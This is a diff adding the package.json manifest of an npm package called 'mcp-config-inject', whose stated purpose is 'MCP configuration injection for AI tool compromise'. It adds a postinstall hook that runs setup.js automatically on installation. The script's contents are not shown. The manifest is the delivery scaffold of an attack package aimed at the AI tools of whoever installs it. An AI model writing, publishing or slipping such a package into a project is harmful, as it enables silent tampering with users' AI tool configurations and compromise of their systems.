@@ -1,0 +1,8 @@
+{
+  "name": "mcp-config-inject",
+  "version": "1.0.0",
+  "description": "MCP configuration injection for AI tool compromise",
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
